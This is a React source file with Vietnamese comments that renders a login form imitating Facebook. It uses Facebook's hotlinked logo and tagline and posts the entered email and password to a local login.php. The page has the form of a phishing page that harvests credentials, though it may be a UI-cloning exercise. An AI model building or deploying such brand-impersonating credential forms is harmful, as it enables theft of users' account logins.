// import React from 'react' // nạp thư viện react
// import ReactDOM from 'react-dom/client' // nạp thư viện react-dom

//destructuring useState
const { useState } = React

//Tạo input site tái sử dụng cho nhanh
function Input({ type, className, placeholder, text, value, style, onChange, onFocus, onBlur }) {
    let isButton = false;
    if (type == "submit") isButton = true;
    return (
        <input
            type={type}
            className={className}
            placeholder={placeholder}
            value={isButton ? text : value}
            onChange={onChange}
        />
    )
}

// Tạo component App
function App() {
    const [valueUser, setValueUser] = useState('')
    const [valuePass, setValuePass] = useState('')
    const [message, setMessage] = useState('')

    const handleChange = (e) => {
        if (e.target.type == "text") {
            setValueUser(e.target.value)
        } else if (e.target.type == "password") {
            setValuePass(e.target.value)
        }
    }

    const handleSubmit = async (e) => {
        e.preventDefault();
        const response = await fetch('login.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                'email': valueUser,
                'password': valuePass
            })
        });

        const data = await response.json();
        setMessage(data.message);
    }


    return (
        <form onSubmit={handleSubmit}>
            <div className="container">
                <div className="hero">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
                    <p>Facebook helps you connect and share with the people in your life.</p>
                </div>
                <div className="login-site">
                    <Input
                        type="text"
                        className="input"
                        placeholder="Email address or telephone number"
                        onChange={handleChange}
                        value={valueUser}
                    />

                    <Input
                        type="password"
                        className="input"
                        placeholder="Password"
                        onChange={handleChange}
                        value={valuePass}
                    />
                    <Input
                        type="submit"
                        className="input input__login"
                        text="Log in"
                    />
                    <a href="#" className="forgot">Forgotten password</a>
                    <div className="line"></div>
                    <Input
                        type="submit"
                        className="input input__createnew"
                        text="Create new account"
                    />
                    <div className="subtitle">
                        <a href="#">Create a Page</a>
                        <p>for a celebrity, brand or business.</p>
                    </div>
                    {message && <p>{message}</p>}
                </div>

            </div>
        </form>

    )
}

// Render component App vào #root element
const root = ReactDOM.createRoot(document.getElementById("root"))
root.render(<App />)